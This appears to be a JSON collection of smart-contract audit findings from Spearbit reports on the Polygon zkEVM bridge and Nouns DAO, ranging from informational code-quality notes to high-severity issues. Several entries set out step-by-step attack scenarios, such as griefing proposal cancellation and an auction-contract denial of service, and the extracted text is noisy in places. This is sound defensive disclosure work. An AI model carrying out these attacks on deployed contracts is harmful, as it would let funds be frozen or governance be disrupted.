        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Functions that are not called from inside of the contract should be external instead of public, which prevents accidentally using a function internally that is meant to be used externally. See also issue \"Use calldata instead of memory for function parameters\".",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational DepositContract.sol#L90, DepositContract.sol#L124, PolygonZkEVMGlobalExitRootL2.sol#L40, PolygonZkEVM-"
        ]
    },
    {
        "title": "Common interface for PolygonZkEVMGlobalExitRoot and PolygonZkEVMGlobalExitRootL2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The contract PolygonZkEVMGlobalExitRoot inherits from IPolygonZkEVMGlobalExitRoot, while PolygonZkEVMGlobalExitRootL2 doesnt, although they both implement a similar interface. Note: PolygonZkEVMGlobalExitRoot implements an extra function getLastGlobalExitRoot(). the same interface le would improve the checks by the compiler. Inheriting from import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\"; contract PolygonZkEVMGlobalExitRoot is IPolygonZkEVMGlobalExitRoot, ... { ... } contract PolygonZkEVMGlobalExitRootL2 { }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Abstract the way to calculate GlobalExitRoot",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The algorithm to combine the mainnetExitRoot and rollupExitRoot is implemented in several locations in the code. This could be abstracted in contract PolygonZkEVMBridge, especially because this will be enhanced when more L2s are added. 30 contract PolygonZkEVMGlobalExitRoot is ... { function updateExitRoot(bytes32 newRoot) external { ... bytes32 newGlobalExitRoot = keccak256(abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) , ); // first ... } function getLastGlobalExitRoot() public view returns (bytes32) { return keccak256(abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) ); // second } } contract PolygonZkEVMBridge is ... { function _verifyLeaf(..., bytes32 mainnetExitRoot, bytes32 rollupExitRoot, ...) ... { ... uint256 timestampGlobalExitRoot = globalExitRootManager .globalExitRootMap( keccak256(abi.encodePacked(mainnetExitRoot, rollupExitRoot)) ); // third , ... } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "ETH honeypot on L2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The initial ETH allocation to the Bridge contract on L2 is rather large: 2E8 ETH on the test network and 1E11 ETH on the production network according to the documentation. This would make the bridge a large honey pot, even more than other bridges. If someone would be able to retrieve the ETH they could exchange it with all available other coins on the L2, bridge them back to mainnet, and thus steal about all TVL on the L2.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Allowance is not required to burn wrapped tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The burn of tokens of the deployed TokenWrapped doesnt use up any allowance, because the Bridge has the right to burn the wrapped token. Normally a user would approve a certain amount of tokens and then do an action (e.g. bridgeAsset()). This could be seen as an extra safety precaution. So you lose the extra safety this way and it might be unexpected from the users point of view. However, its also very convenient to do a one-step bridge (comparable to using the permit). Note: most other bridges do it also this way. function burn(address account, uint256 value) external onlyBridge { _burn(account, value); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Messages are lost when delivered to EOA by claimMessage()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function claimMessage() calls the function onMessageReceived() via a low-level call. When the receiving address doesnt contain a contract the low-level call still succeeds and delivers the ETH. The documen- tation says: \"... IBridgeMessageReceiver interface and such interface must be fullled by the receiver contract, it will ensure that the receiver contract has implemented the logic to handle the message.\" As we understood from the project this behavior is intentional. It can be useful to deliver ETH to Externally owned accounts (EOAs), however, the message (which is the main goal of the function) isnt interpreted and thus lost, without any notication. The loss of the delivery of the message to EOAs (e.g. non contracts) might not be obvious to the casual readers of the code/documentation. function claimMessage(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Replace assembly of _getSelector() with Solidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function _getSelector() gets the rst four bytes of a series of bytes and used assembly. This can also be implemented in Solidity, which is easier to read. function _getSelector(bytes memory _data) private pure returns (bytes4 sig) { assembly { sig := mload(add(_data, 32)) } } function _permit(..., bytes calldata permitData) ... { bytes4 sig = _getSelector(permitData); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improvement suggestions for Verifier.sol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Verifier.sol is a contract automatically generated by snarkjs and is based on the template ver- ier_groth16.sol.ejs. There are some details that can be improved on this contract. However, changing it will require doing PRs for the Snarkjs project.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Variable named incorrectly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Seems like the variable veryBatchTimeTarget was meant to be named verifyBatchTimeTarget as evidenced from the comment below: // Check if timestamp is above or below the VERIFY_BATCH_TIME_TARGET",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Add additional comments to function forceBatch()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function forceBatch() contains a comment about synch attacks. what is meant by that. The team explained the following: Its not immediately clear  Getting the call data from an EOA is easy/cheap so no need to put the transactions in the event (which is expensive).  Getting the internal call data from internal transactions (which is done via a smart contract) is complicated (because it requires an archival node) and then its worth it to put the transactions in the event, which is easy to query. function forceBatch(...) ... { ... // In order to avoid synch attacks, if the msg.sender is not the origin // Add the transaction bytes in the event if (msg.sender == tx.origin) { emit ForceBatch(lastForceBatch, lastGlobalExitRoot, msg.sender, \"\"); } else { emit ForceBatch(lastForceBatch,lastGlobalExitRoot,msg.sender,transactions); } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Check against MAX_VERIFY_BATCHES",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "**In several functions a comparison is made with < MAX_VERIFY_BATCHES. This should probably be <= MAX_VERIFY_BATCHES, otherwise, the MAX will never be reached. uint64 public constant MAX_VERIFY_BATCHES = 1000; function sequenceForceBatches(ForcedBatchData[] memory batches) ... { uint256 batchesNum = batches.length; ... require(batchesNum < MAX_VERIFY_BATCHES, ... ); ... } function sequenceBatches(BatchData[] memory batches) ... { uint256 batchesNum = batches.length; ... require(batchesNum < MAX_VERIFY_BATCHES, ...); ... } function verifyBatches(...) ... { ... require(finalNewBatch - initNumBatch < MAX_VERIFY_BATCHES, ... ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prepare for multiple aggregators/sequencers to improve availability",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "As long are there is one (trusted)sequencer and one (trusted)aggregator the availability risks are relatively high. However, the current code isnt optimized to support multiple trusted sequencers and multiple trusted aggregators. modifier onlyTrustedSequencer() { require(trustedSequencer == msg.sender, ... ); _; } modifier onlyTrustedAggregator() { require(trustedAggregator == msg.sender, ... ); _; }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Temporary Fund freeze on using Multiple Rollups",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Claiming of Assets will freeze temporarily if multiple rollups are involved as shown below. The asset will be lost if the transfer is done between: a. Mainnet -> R1 -> R2 b. R1 -> R2 -> Mainnet 1. USDC is bridged from Mainnet to Rollover R1 with its metadata. 2. User claims this and a new Wrapped token is prepared using USDC token and its metadata. bytes32 tokenInfoHash = keccak256(abi.encodePacked(originNetwork, originTokenAddress)); TokenWrapped newWrappedToken = (new TokenWrapped){salt: tokenInfoHash}(name, symbol, decimals); 3. Lets say the User bridge this token to Rollup R2. This will burn the wrapped token on R1 if (tokenInfo.originTokenAddress != address(0)) { // The token is a wrapped token from another network // Burn tokens TokenWrapped(token).burn(msg.sender, amount); originTokenAddress = tokenInfo.originTokenAddress; originNetwork = tokenInfo.originNetwork; } 4. The problem here is now while bridging the metadata was not set. 5. So once the user claims this on R2, wrapped token creation will fail since abi.decode on empty metadata will fail to retrieve name, symbol,... The asset will be temporarily lost since it was bridged properly but cannot be claimed Showing the transaction chain Mainnet bridgeAsset(usdc,R1,0xUser1, 100, )  Transfer 100 USDC to Mainnet M1  originTokenAddress=USDC  originNetwork = Mainnet  metadata = (USDC,USDC,6)  Deposit node created R1 claimAsset(...,Mainnet,USDC,R1,0xUser1,100, metadata = (USDC,USDC,6))  Claim veried  Marked claimed  tokenInfoHash derived from originNetwork, originTokenAddress which is Mainnet, USDC  tokenInfoToWrappedToken[Mainnet,USDC] created using metadata = (USDC,USDC,6)  User minted 100 amount of tokenInfoToWrappedToken[Mainnet, USDC] bridgeAsset(tokenInfoToWrappedToken[Mainnet,USDC],R2,0xUser2, 100, )  Burn 100 tokenInfoToWrappedToken[Mainnet,USDC]  originTokenAddress=USDC  originNetwork = Mainnet 36  metadata = \"\"  Deposit node created with empty metadata R2 claimAsset(...,Mainnet,USDC,R2,0xUser2,100, metadata = \"\")  Claim veried  Marked claimed  tokenInfoHash derived from originNetwork, originTokenAddress which is Mainnet, USDC  Since metadata = \"\" , abi decode fails",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Off by one error when comparing with MAX_TRANSACTIONS_BYTE_LENGTH constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "When comparing against MAX_TRANSACTIONS_BYTE_LENGTH, the valid range should be <= instead of <. require( transactions.length < MAX_TRANSACTIONS_BYTE_LENGTH, \"PolygonZkEVM::forceBatch: Transactions bytes overflow\" ); require( currentBatch.transactions.length < MAX_TRANSACTIONS_BYTE_LENGTH, \"PolygonZkEVM::sequenceBatches: Transactions bytes overflow\" );",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "trustedAggregatorTimeout value may impact batchFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "If trustedAggregatorTimeout and veryBatchTimeTarget are valued nearby then all batches veri- ed by 3rd party will be above target (totalBatchesAboveTarget) and this would impact batch fees. 1. Lets say veryBatchTimeTarget is 30 min and trustedAggregatorTimeout is 31 min. 2. Now anyone can call verifyBatches only after 31 min due to the below condition. 37 require( ); sequencedBatches[finalNewBatch].sequencedTimestamp + trustedAggregatorTimeout <= block.timestamp, \"PolygonZkEVM::verifyBatches: Trusted aggregator timeout not expired\" 3. This means _updateBatchFee can at minimum be called after 31 min of sequencing by a nontrusted aggre- gator. 4. The below condition then always returns true. if ( // 31>30 ) { block.timestamp - currentSequencedBatchData.sequencedTimestamp >veryBatchTimeTarget",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Largest allowed batch fee multiplier is 1023 instead of 1024",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Per the setMultiplierBatchFee function, the largest allowed batch fee multiplier is 1023. /** * @notice Allow the admin to set a new multiplier batch fee * @param newMultiplierBatchFee multiplier bathc fee */ function setMultiplierBatchFee( uint16 newMultiplierBatchFee ) public onlyAdmin { require( newMultiplierBatchFee >= 1000 && newMultiplierBatchFee < 1024, \"PolygonZkEVM::setMultiplierBatchFee: newMultiplierBatchFee incorrect range\" ); multiplierBatchFee = newMultiplierBatchFee; emit SetMultiplierBatchFee(newMultiplierBatchFee); } However, the comment mentioned that the largest allowed is 1024. // Batch fee multiplier with 3 decimals that goes from 1000 - 1024 uint16 public multiplierBatchFee;",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Deposit token associated Risk Awareness",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The deposited tokens locked in L1 could be at risk due to external conditions like the one shown below: 1. Assume there is a huge amount of token X being bridged to roll over. 2. Now mainnet will have a huge balance of token X. 3. Unfortunately due to a hack or LUNA like condition, the project owner takes a snapshot of the current token X balance for each user address and later all these addresses will be airdropped with a new token based on screenshot value. 4. In this case, token X in mainnet will be screenshot but at disbursal time the newly updated token will be airdropped to mainnet and not the user. 5. Now there is no emergencywithdraw method to get these airdropped funds out. 6. For the users, if they claim funds they still get token X which is worthless.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Fees might get stuck when Aggregator is unable to verify",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The collected fees from Sequencer will be stuck in the contract if Aggregator is unable to verify the batch. In this case, Aggregator will not be paid and the batch transaction fee will get stuck in the contract",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider using OpenZeppelins ECDSA library over ecrecover",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "As stated here, ecrecover is vulnerable to a signature malleability attack. While the code in permit is not vulnerable since a nonce is used in the signed data, Id still recommend using OpenZeppelins ECDSA library, as it does the malleability safety check for you as well as the signer != address(0) check done on the next line.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Risk of transactions not yet in Consolidated state on L2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There is are relatively long period for batches and thus transactions are to be between Trusted state and Consolidated state. Normally around 30 minutes but in exceptional situations up to 2 weeks. On the L2, users normally interact with the Trusted state. However, they should be aware of the risk for high-value transactions (especially for transactions that cant be undone, like transactions that have an effect outside of the L2, like off ramps, OTC transactions, alternative bridges, etc). There will be custom RPC endpoints that can be used to retrieve status information, see zkevm.go.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Delay of bridging from L2 to L1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridge uses the Consolidated state while bridging from L2 to L1 and the user interface It can take between 15 min and 1 hour.\". Other (opti- public.zkevm-test.net, shows \"Waiting for validity proof. mistic) bridges use liquidity providers who take the risk and allow users to retrieve funds in a shorter amount of time (for a fee).",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing Natspec documentation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Some NatSpec comments are either missing or are incomplete.  Missing NatSpec comment for pendingStateNum: /** * @notice Verify batches internal function * @param initNumBatch Batch which the aggregator starts the verification * @param finalNewBatch Last batch aggregator intends to verify * @param newLocalExitRoot * @param newStateRoot New State root once the batch is processed * @param proofA zk-snark input * @param proofB zk-snark input * @param proofC zk-snark input */ function _verifyBatches( New local exit root once the batch is processed uint64 pendingStateNum, uint64 initNumBatch, uint64 finalNewBatch, bytes32 newLocalExitRoot, bytes32 newStateRoot, uint256[2] calldata proofA, uint256[2][2] calldata proofB, uint256[2] calldata proofC ) internal {  Missing NatSpec comment for pendingStateTimeout: /** * @notice Struct to call initialize, this basically saves gas becasue pack the parameters that can be packed , * and avoid stack too deep errors. * @param admin Admin address * @param chainID L2 chainID * @param trustedSequencer Trusted sequencer address * @param forceBatchAllowed Indicates wheather the force batch functionality is available * @param trustedAggregator Trusted aggregator * @param trustedAggregatorTimeout Trusted aggregator timeout */ struct InitializePackedParameters { address admin; uint64 chainID; address trustedSequencer; uint64 pendingStateTimeout; bool forceBatchAllowed; address trustedAggregator; uint64 trustedAggregatorTimeout; }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "_minDelay could be 0 without emergency",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Normally min delay is only supposed to be 0 when in an emergency state. But this could be made to 0 even in nonemergency mode as shown below: 1. Proposer can propose an operation for changing _minDelay to 0 via updateDelay function. 2. Now, if this operation is executed by the executor then _minDelay will be 0 even without an emergency state. **",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect/incomplete comment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There are a few mistakes in the comments that can be corrected in the codebase.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos, grammatical and styling errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There are a few typos and grammatical mistakes that can be corrected in the codebase. Some functions could also be renamed to better reect their purposes.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Enforce parameters limits in initialize() of PolygonZkEVM",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function initialize() of PolygonZkEVM doesnt enforce limits on trustedAggregatorTime- out and pendingStateTimeout, whereas the update functions setTrustedAggregatorTimeout() and setPend- ingStateTimeout(). As the project has indicated it might be useful to set larger values in initialize(). function initialize(..., InitializePackedParameters calldata initializePackedParameters,...) ... { trustedAggregatorTimeout = initializePackedParameters.trustedAggregatorTimeout; ... pendingStateTimeout = initializePackedParameters.pendingStateTimeout; ... } function setTrustedAggregatorTimeout(uint64 newTrustedAggregatorTimeout) public onlyAdmin { require(newTrustedAggregatorTimeout <= HALT_AGGREGATION_TIMEOUT,....); ... trustedAggregatorTimeout = newTrustedAggregatorTimeout; ... } function setPendingStateTimeout(uint64 newPendingStateTimeout) public onlyAdmin { require(newPendingStateTimeout <= HALT_AGGREGATION_TIMEOUT, ... ); ... pendingStateTimeout = newPendingStateTimeout; ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Findings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48 2 1 About Spearbit Spearbit is a decentralized network of expert security engineers offering reviews and other security related services to Web3 projects with the goal of creating a stronger ecosystem. Our network has experience on every part of the blockchain technology stack, including but not limited to protocol design, smart contracts and the Solidity compiler. Spearbit brings in untapped security talent by enabling expert freelance auditors seeking exibility to work on interesting projects together. Learn more about us at spearbit.com 2 Introduction Smart contract implementation which will be used by the Polygon-Hermez zkEVM. Disclaimer : This security review does not guarantee against a hack. It is a snapshot in time of zkEVM-Contracts according to the specic commit. Any modications to the code will require a new security review. 3 Risk classication Severity level Likelihood: high Likelihood: medium High Likelihood: low Medium Impact: High Impact: Medium Impact: Low Critical High Medium Low Medium Low Low 3.1 Impact  High - leads to a loss of a signicant portion (>10%) of assets in the protocol, or signicant harm to a majority of users.  Medium - global losses <10% or losses to only a subset of users, but still unacceptable.  Low - losses will be annoying but bearable--applies to things like grieng attacks that can be easily repaired or even gas inefciencies. 3.2 Likelihood  High - almost certain to happen, easy to perform, or not easy but highly incentivized  Medium - only conditionally possible or incentivized, but still relatively likely  Low - requires stars to align, or little-to-no incentive 3.3 Action required for severity levels  Critical - Must x as soon as possible (if already deployed)  High - Must x (before deployment if not already deployed)  Medium - Should x  Low - Could x 4 Executive Summary Over the course of 13 days in total, Polygon engaged with Spearbit to review the zkevm-contracts protocol. In this period of time a total of 68 issues were found. 3 Summary Project Name Polygon Repository Commit zkevm-contracts 5de59e...f899 Type of Project Cross Chain, Bridge Audit Timeline Jan 9 - Jan 25 Two week x period Jan 25 - Feb 8 Severity Critical Risk High Risk Medium Risk Low Risk Gas Optimizations Informational Total Issues Found Count Fixed Acknowledged 0 0 3 16 19 30 68 0 0 3 10 18 19 50 0 0 0 6 1 11 18 4 5 Findings 5.1 Medium Risk 5.1.1 Funds can be sent to a non existing destination",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function bridgeAsset() and bridgeMessage() do check that the destination network is different If accidentally the wrong than the current network. However, they dont check if the destination network exists. networkId is given as a parameter, then the function is sent to a nonexisting network. If the network would be deployed in the future the funds would be recovered. However, in the meantime they are inaccessible and thus lost for the sender and recipient. Note: other bridges usually have validity checks on the destination. function bridgeAsset(...) ... { require(destinationNetwork != networkID, ... ); ... } function bridgeMessage(...) ... { require(destinationNetwork != networkID, ... ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Any signer can cancel a pending/active proposal to grief the proposal process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Any proposal signer, besides the proposer, can cancel the proposal later irrespective of the number of votes they contributed earlier towards the threshold. The signer could even have zero votes because getPrior- Votes(signer,..) is not checked for a non-zero value in verifySignersCanBackThisProposalAndCountTheir- Votes() as part of the proposeBySigs() flow. This seems to be a limitation of the design described in hackmd.io/@el4d/nouns-dao-v3-spec#Cancel. With the signature-based scheme, every signer is as powerful as the proposer. As long as their combined votes meets threshold, it does not matter who contributed how much to the voting power. And assuming everyone contributed some non-zero power, they are all given the cancellation capability. However, for example, a signer/proposer with 0 voting power is treated on par with any other signer who contributed 10 Nouns towards meeting the proposal threshold. A malicious signer can sign-off on every valid proposal to later cancel it. The vulnerability arises from a lack of voting power check on signer and the cancel capability given to any signer. Example scenario: Evil, without having to own a single Noun, creates a valid signature to back every signature- based proposal from a different account (to bypass checkNoActiveProp()) and gets it included in the proposal creation process via proposeBySigs(). Evil then cancels every such proposal at will, i.e. no signature-based proposal that Evil manages to get included into, potentially all of them, will ever get executed. Impact: This allows a malicious griefing signer who could really be anyone without having to own any Nouns but manages to get their signature included in the proposeBySigs() to cancel that proposal later. This effectively gives anyone a veto power on all signature-based proposals. High likelihood + Medium impact = High severity.  Likelihood is High because anyone with no special ownership (of Nouns) or special roles in the protocol frontend could initiate a signature to be accepted by the proposer. We assume no other checks by e.g. because those are out-of-scope, not specified/documented, depend on the implementation, depend on their trust/threat models or may be bypassed with protocol actors interacting directly with the contracts. We cannot be sure of how the proposer decides on which signatures to include and what checks are actually made, be- cause that is done offchain. Without that information, we are assuming that proposer includes all signatures they receive.  Impact is Medium because, with the Likelihood rationale, anyone can get their signature included to later cancel a signature-backed proposal, which in the worst case (again without additional checks/logic) gives anyone a veto power on all signature-based proposals to potentially bring governance to a standstill if sig- natures are expected to be the dominant approach forward. Even if we assume that a proposer learns to exclude a zero-vote cancelling signer (with external checks) after experiencing this griefing, the signer can move on to other unsuspecting proposers. Given that this is one of the key features of V3 UX, we reason that this permissionless griefing DoS on governance to be at Medium impact. While the cancellation capability is indeed specified as the intended design, we reason that this is a risky feature for the reasons explained above. This should ideally be determined based only on the contributing voting power as suggested in our recommendation. Filtering out signers with zero voting power raises the bar from the current situation in requiring signers to have non-zero voting power (i.e. cost of griefing attack becomes non-zero) but will not prevent signers from transferring their voting power granting Noun(s) to other addresses, get new valid signatures included on other signature-based proposals and grief them later by cancelling. Equating a non-zero voting power to a veto power on all signature-based proposals in the protocol continues to be very risky.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Potential Denial of Service (DoS) attack on NounsAuctionHouseFork Contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The potential vulnerability arises during the initialization of the NounsAuctionHouseFork contract, which is deployed and initialized via the executeFork() function when a new fork is created. At this stage, the state variable startNounId within the NounsTokenFork contract is set corresponding to the nounId currently being auctioned in the NounsAuctionHouse. It should be noted that the NounsAuctionHouseFork contract is initially in a paused state and requires a successful proposal to unpause it, thus enabling the minting of new nouns tokens within the fork. Based on the current structure, an attacker can execute a DoS attack through the following steps: 7 1. Assume the executeFork() threshold is 7 nouns and the attacker owns 8 nouns. The current nounId being auctioned is 735. 2. The attacker places the highest bid for nounId 735 in the NounsAuctionHouse contract and waits for the auction's conclusion. 3. Once the auction concludes, the attacker calls escrowToFork() with his 8 nouns, triggering the execute- Fork() threshold. 4. Upon invoking executeFork(), new fork contracts are deployed. Below is the state of both NounsAuction- HouseFork and NounsAuctionHouse contracts at this juncture: NounsAuctionHouseFork state: nounId -> 0 amount -> 0 startTime -> 0 endTime -> 0 bidder -> 0x0000000000000000000000000000000000000000 settled -> false NounsAuctionHouse state: nounId -> 735 amount -> 50000000000000000000 startTime -> 1686014675 endTime -> 1686101075 bidder -> 0xE6b3367318C5e11a6eED3Cd0D850eC06A02E9b90 (attacker's address) settled -> false 5. The attacker executes settleCurrentAndCreateNewAuction() on the NounsAuctionHouse contract, thereby acquiring the nounId 735. 6. Following this, the attacker invokes joinFork() on the main DAO and joins the fork with nounId 735. This action effectively mints nounId 735 within the fork and subsequently triggers a DoS state in the NounsAuc- tionHouseFork contract. 7. At a later time, a proposal is successfully passed and the unpause() function is called on the NounsAuction- HouseFork contract. 8. A revert occurs when the _createAuction() function tries to mint tokenId 735 in the fork (which was already minted during the joinFork() call), thus re-pausing the contract. More broadly, this could happen if the buyer of the fork DAO's startNounId (and successive ones) on the original DAO (i.e. the first Nouns that get auctioned after a fork is executed) joins the fork with those tokens, even without any malicious intent, before the fork's auction is unpaused by its governance. Applying of delayed governance on fork DAO makes this timing-based behavior more feasible. One has to buy one or more of the original DAO tokens auctioned after the fork was executed and use them to join the fork immediately. The NounsAuctionHouseFork contract gets into a DoS state, necessitating a contract update in the NounsToken- Fork contract to manually increase the _currentNounId state variable to restore the normal flow in the NounsAuc- tionHouseFork. High likelihood + Medium impact = High Severity. Likelihood: High, because its a very likely scenario to happen, even unintentionally, the scenario can be triggered by a non-malicious user that just wants to join the fork with a fresh bought Noun from the auction house. Impact: Medium, because forking is bricked for at least several weeks until the upgrade proposal passes and is in place. This is not simply having a contract disabled for a period of time, this can be considered as a loss of assets for the Forked DAO as well, i.e. imagine that the Forked DAO needs funding immediately. On top of this, the contract upgrade would have to be done on the NounsTokenFork contract to correct the _currentNounId state variable to a valid value and fix the Denial of Service in the NounsAuctionHouseFork. Would the fork joiners be willing to perform such a risky update in such a critical contract?",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Total supply can be low down to zero after the fork, allowing for execution of exploiting proposals from any next joiners",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Total supply can be low down to reaching zero during forking period, so any holder then entering forked DAO with joinFork() can push manipulating proposals and force all the later joiners either to rage quit or to be exploited. As an example, if there is a group of nouns holders that performed fork for pure financial reasons, all claimed forked nouns and quitted. Right after that it is block.timestamp < forkingPeriodEndTimestamp, so isForkPe- riodActive(ds) == true in original DAO contract. In the same time forked token's adjustedTotalSupply is zero (all new tokens were sent to timelock):  NounsDAOLogicV1Fork.sol#L201-L208 function quit(uint256[] calldata tokenIds) external nonReentrant { ... for (uint256 i = 0; i < tokenIds.length; i++) { >> nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); }  NounsDAOLogicV1Fork.sol#L742-L744 function adjustedTotalSupply() public view returns (uint256) { return nouns.totalSupply() - nouns.balanceOf(address(timelock)); } Also, NounsTokenFork.remainingTokensToClaim() == 0, so checkGovernanceActive() check does not revert in the forked DAO contract:  NounsDAOLogicV1Fork.sol#L346-L349) function checkGovernanceActive() internal view { if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > ,! 0) revert WaitingForTokensToClaimOrExpiration(); } Original DAO holders can enter new DAO with joinFork() only, that will keep checkGovernanceActive() non- reverting in the forked DAO contract: 9  NounsDAOV3Fork.sol#L139-L158 function joinFork( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, uint256[] calldata proposalIds, string calldata reason ) external { ... for (uint256 i = 0; i < tokenIds.length; i++) { ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]); } >> 